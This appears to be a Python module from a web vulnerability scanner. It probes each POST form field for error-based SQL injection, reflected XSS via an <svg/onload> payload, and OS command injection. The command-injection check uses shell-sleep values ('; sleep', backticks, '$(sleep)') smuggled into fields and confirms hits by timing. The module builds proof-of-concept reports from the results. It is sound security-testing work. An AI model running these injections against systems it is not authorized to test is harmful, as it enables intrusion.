"""POST-form injection verifiers.

Many classic apps (DVWA command-injection, login/search forms, most Java/PHP
apps) take input via POST bodies, not query strings — so the GET-param verifiers
never reach them. This module injects into each field of a captured POST form and
applies the SAME deterministic proof standard:

- error-based SQLi  -> a database error surfaces
- reflected XSS     -> the <svg/onload> breakout survives unencoded
- command injection -> a reproducible, measured time delay (sleep)

Only verifier-proven results are returned; nothing is asserted on reflection
alone. Submit-button fields and obvious anti-CSRF tokens are left untouched.
"""
from urllib.parse import urlencode

from .verifiers import SQL_ERRORS, XSS_MARK, XSS_PAYLOAD

_FORM_HDR = "Content-Type: application/x-www-form-urlencoded"
_SKIP_FIELDS = {"submit", "login", "csrf_token", "user_token", "authenticity_token",
                "_token", "csrfmiddlewaretoken", "__requestverificationtoken"}
# shell-sleep payloads tried for command injection (unix + win)
_CMD = ["{v}; sleep {n}", "{v} && sleep {n}", "{v} | sleep {n}",
        "{v}`sleep {n}`", "{v}$(sleep {n})"]


def _injectable(inputs):
    return [k for k in inputs if k.lower() not in _SKIP_FIELDS]


def _post(send, action, inputs, field, value):
    body = urlencode({**inputs, field: value})
    return send("POST", action, headers=_FORM_HDR, body=body)


def _timed_post(send, action, inputs, field, value):
    r = _post(send, action, inputs, field, value)
    return (r.get("elapsed") if r.get("ok") else None), r


def check_post_sqli(send, form):
    action, inputs = form["action"], form["inputs"]
    out = []
    for field in _injectable(inputs):
        r = _post(send, action, inputs, field, (inputs.get(field) or "1") + "'")
        if not r.get("ok"):
            continue
        low = (r.get("text") or "").lower()
        hit = next((s for s in SQL_ERRORS if s in low), None)
        if hit:
            body = urlencode({**inputs, field: (inputs.get(field) or "1") + "'"})
            out.append(dict(
                title=f"SQL injection (error-based) via POST '{field}'",
                vuln_class="hunt-sqli", severity="critical",
                cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", confidence="confirmed",
                description=f"POST field '{field}' on {action} triggers a database error "
                            f"({hit!r}) when a single quote is appended — the value reaches a "
                            f"SQL query unsanitised.",
                steps=f"POST {action} with body: {body}",
                poc_request=f"POST {action}\n{_FORM_HDR}\n\n{body}",
                poc_response=(r.get("text") or "")[:800]))
    return out


def check_post_xss(send, form):
    action, inputs = form["action"], form["inputs"]
    out = []
    for field in _injectable(inputs):
        r = _post(send, action, inputs, field, XSS_PAYLOAD)
        if not r.get("ok"):
            continue
        body = r.get("text") or ""
        if f'{XSS_MARK}"><svg' in body:
            sent = urlencode({**inputs, field: XSS_PAYLOAD})
            out.append(dict(
                title=f"Reflected XSS via POST '{field}'",
                vuln_class="hunt-xss", severity="high",
                cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", confidence="confirmed",
                description=f"POST field '{field}' on {action} reflects HTML metacharacters "
                            f"unencoded; the injected <svg/onload> survives in the response.",
                steps=f"POST {action} with body: {sent}",
                poc_request=f"POST {action}\n{_FORM_HDR}\n\n{sent}",
                poc_response=(body[:800])))
    return out


def check_post_cmd(send, form):
    """Command injection via POST, proven by a reproducible measured delay."""
    action, inputs = form["action"], form["inputs"]
    out = []
    for field in _injectable(inputs):
        base_e, _ = _timed_post(send, action, inputs, field, inputs.get(field) or "1")
        if base_e is None:
            continue
        for tmpl in _CMD:
            long_e, lr = _timed_post(send, action, inputs, field,
                                     tmpl.format(v=inputs.get(field) or "1", n=5))
            if long_e is None or (long_e - base_e) < 3.5:
                continue
            # double-check with a short sleep so a slow server isn't mistaken for a hit
            short_e, _ = _timed_post(send, action, inputs, field,
                                     tmpl.format(v=inputs.get(field) or "1", n=2))
            if short_e is None or not ((long_e - short_e) >= 1.5 and (short_e - base_e) >= 0.5):
                continue
            body = urlencode({**inputs, field: tmpl.format(v=inputs.get(field) or "1", n=5)})
            out.append(dict(
                title=f"OS command injection via POST '{field}'",
                vuln_class="hunt-cmd", severity="critical",
                cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", confidence="confirmed",
                description=f"POST field '{field}' on {action} executes shell commands: a sleep "
                            f"payload reproducibly delays the response "
                            f"(baseline={base_e:.1f}s, sleep(2)={short_e:.1f}s, sleep(5)={long_e:.1f}s).",
                steps=f"POST {action} with body: {body}  (response delays ~5s)",
                poc_request=f"POST {action}\n{_FORM_HDR}\n\n{body}",
                poc_response=(lr.get("text") or "")[:400]))
            break   # one proof per field is enough
    return out


def check_post_form(send, form):
    out = []
    for fn in (check_post_sqli, check_post_xss, check_post_cmd):
        try:
            out += fn(send, form)
        except Exception:
            pass
    return out
